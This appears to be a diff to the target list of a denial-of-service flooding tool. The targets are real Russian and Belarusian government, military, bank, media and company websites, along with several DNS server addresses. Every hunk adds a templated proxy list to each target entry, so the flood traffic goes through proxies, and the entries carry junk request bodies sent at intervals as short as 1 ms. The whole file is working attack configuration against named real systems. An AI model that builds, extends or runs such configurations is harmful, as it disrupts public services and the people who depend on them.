@@ -10,7 +10,7 @@
           "Authorization": "Bearer: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
         },
         "body": "lkasdng.,afgn.,asngfjklawne;la nsdfjasd;sa.gn wjae fnjaksdbgjkasndg,.asdnfm,sadnf,.mn",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -34,7 +34,7 @@
           "Sec-Fetch-Dest": "document",
           "Accept-Language": "en-US,en;q=0.9,ru;q=0.8,uk;q=0.7"
         },
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -43,7 +43,7 @@
         "address": "194.54.14.186:53",
         "interval_ms": 1,
         "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -52,7 +52,7 @@
         "address": "194.54.14.187:53",
         "interval_ms": 1,
         "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -61,7 +61,7 @@
         "address": "194.67.7.1:53 ",
         "interval_ms": 1,
         "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -70,7 +70,7 @@
         "address": "194.67.2.109:53",
         "interval_ms": 1,
         "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -93,7 +93,7 @@
           "Sec-Fetch-Dest": "document",
           "Accept-Language": "en-US,en;q=0.9,ru;q=0.8,uk;q=0.7"
         },
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -102,7 +102,7 @@
         "address": " 80.87.198.26:53",
         "interval_ms": 135,
         "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -125,7 +125,7 @@
           "Sec-Fetch-Dest": "document",
           "Accept-Language": "en-US,en;q=0.9,ru;q=0.8,uk;q=0.7"
         },
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -134,7 +134,7 @@
         "address": "178.248.236.218:77",
         "interval_ms": 135,
         "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -143,7 +143,7 @@
         "address": "178.248.236.218:80",
         "interval_ms": 135,
         "body": "lasdhgk;jasngjkla;sdbngjkalnerjasndkgjbadsgjklabrgjkbsandkjgbasklebgjaskbdgaskljdgbaslhkdg",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -152,7 +152,7 @@
         "method": "GET",
         "path": "https://tinkoff.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -179,7 +179,7 @@
         "method": "GET",
         "path": "https://www.moex.com/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -188,7 +188,7 @@
         "method": "GET",
         "path": "https://rk.gov.ru",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -197,7 +197,7 @@
         "method": "GET",
         "path": "https://www.rbc.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -206,7 +206,7 @@
         "method": "GET",
         "path": "https://belinvestbank.by/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -215,7 +215,7 @@
         "method": "GET",
         "path": "http://riafan.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -224,7 +224,7 @@
         "method": "GET",
         "path": "http://gazeta.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -233,7 +233,7 @@
         "method": "GET",
         "path": "http://government.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -242,7 +242,7 @@
         "method": "GET",
         "path": "https://bezformata.com/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -251,7 +251,7 @@
         "method": "GET",
         "path": "https://www.yaplakal.com/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -260,7 +260,7 @@
         "method": "GET",
         "path": "https://pikabu.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -269,7 +269,7 @@
         "method": "GET",
         "path": "https://www.crimea.kp.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -278,7 +278,7 @@
         "method": "GET",
         "path": "https://rkn.gov.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -287,7 +287,7 @@
         "method": "GET",
         "path": "https://www.uralkali.com/ru/?utm_source=block-moskal.ml&utm_medium=referral&utm_campaign=block-moskal.ml&utm_referrer=block-moskal.ml",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -296,7 +296,7 @@
         "method": "GET",
         "path": "https://lukoil.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -305,7 +305,7 @@
         "method": "GET",
         "path": "https://www.evraz.com/ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -314,7 +314,7 @@
         "method": "GET",
         "path": "http://www.metalloinvest.com/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -323,7 +323,7 @@
         "method": "GET",
         "path": "https://www.surgutneftegas.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -332,7 +332,7 @@
         "method": "GET",
         "path": "https://www.nornickel.com/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -341,7 +341,7 @@
         "method": "GET",
         "path": "https://www.nornickel.com/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -350,7 +350,7 @@
         "method": "GET",
         "path": "https://www.belapb.by/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -359,7 +359,7 @@
         "method": "GET",
         "path": "https://brrb.by/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -368,7 +368,7 @@
         "method": "GET",
         "path": "https://belarusbank.by/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -377,7 +377,7 @@
         "method": "GET",
         "path": "http://www.prokuratura.gov.by/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -386,7 +386,7 @@
         "method": "GET",
         "path": "http://www.kgb.by/ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -395,7 +395,7 @@
         "method": "GET",
         "path": "http://www.nbrb.by/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -404,7 +404,7 @@
         "method": "GET",
         "path": "https://www.mvd.gov.by/ru",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -413,7 +413,7 @@
         "method": "GET",
         "path": "https://president.gov.by/ru",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -422,7 +422,7 @@
         "method": "GET",
         "path": "http://www.government.by/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -431,7 +431,7 @@
         "method": "GET",
         "path": "https://www.mil.by/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -440,7 +440,7 @@
         "method": "GET",
         "path": "http://kommersant.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -449,7 +449,7 @@
         "method": "GET",
         "path": "http://ria.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -458,7 +458,7 @@
         "method": "GET",
         "path": "https://pfr.gov.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -467,7 +467,7 @@
         "method": "GET",
         "path": "https://customs.gov.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -476,7 +476,7 @@
         "method": "GET",
         "path": "https://www.nalog.gov.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -485,7 +485,7 @@
         "method": "GET",
         "path": "https://mil.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -494,7 +494,7 @@
         "method": "GET",
         "path": "https://kremlin.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -503,7 +503,7 @@
         "method": "GET",
         "path": "https://www.mos.ru/uslugi/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -512,7 +512,7 @@
         "method": "GET",
         "path": "https://www.gosuslugi.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -521,7 +521,7 @@
         "method": "GET",
         "path": "https://www.gazprombank.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -530,7 +530,7 @@
         "method": "GET",
         "path": "https://www.vtb.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -539,7 +539,7 @@
         "method": "GET",
         "path": "http://omk.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -548,7 +548,7 @@
         "method": "GET",
         "path": "https://nangs.org/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -557,7 +557,7 @@
         "method": "GET",
         "path": "https://www.sibur.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -566,7 +566,7 @@
         "method": "GET",
         "path": "https://www.tatneft.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -575,7 +575,7 @@
         "method": "GET",
         "path": "https://www.gazprom.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -584,7 +584,7 @@
         "method": "GET",
         "path": "https://magnit.ru/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -593,7 +593,7 @@
         "method": "GET",
         "path": "https://nlmk.com/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -602,7 +602,7 @@
         "method": "GET",
         "path": "https://www.severstal.com/",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -614,7 +614,7 @@
           "Authorization": "Bearer: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
         },
         "body": "lkasdng.,afgn.,asngfjklawne;la nsdfjasd;sa.gn wjae fnjaksdbgjkasndg,.asdnfm,sadnf,.mn",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -623,7 +623,7 @@
         "method": "GET",
         "path": "https://passport.rt.ru/auth/realms/b2b/protocol/openid-connect/auth?client_id=lk_b2b",
         "headers": {},
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -635,7 +635,7 @@
           "Authorization": "Bearer: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
         },
         "body": "lkasdng.,afgn.,asngfjklawne;la nsdfjasd;sa.gn wjae fnjaksdbgjkasndg,.asdnfm,sadnf,.mn",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -647,7 +647,7 @@
           "Authorization": "Bearer: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
         },
         "body": "lkasdng.,afgn.,asngfjklawne;la nsdfjasd;sa.gn wjae fnjaksdbgjkasndg,.asdnfm,sadnf,.mn",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -659,7 +659,7 @@
           "Authorization": "Bearer: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
         },
         "body": "lkasdng.,afgn.,asngfjklawne;la nsdfjasd;sa.gn wjae fnjaksdbgjkasndg,.asdnfm,sadnf,.mn",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     },
     {
@@ -671,7 +671,7 @@
           "Authorization": "Bearer: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
         },
         "body": "lkasdng.,afgn.,asngfjklawne;la nsdfjasd;sa.gn wjae fnjaksdbgjkasndg,.asdnfm,sadnf,.mn",
-        "client": {}
+        "client": { "proxy_urls": "{{ get_proxylist }}" }
       }
     }
   ]
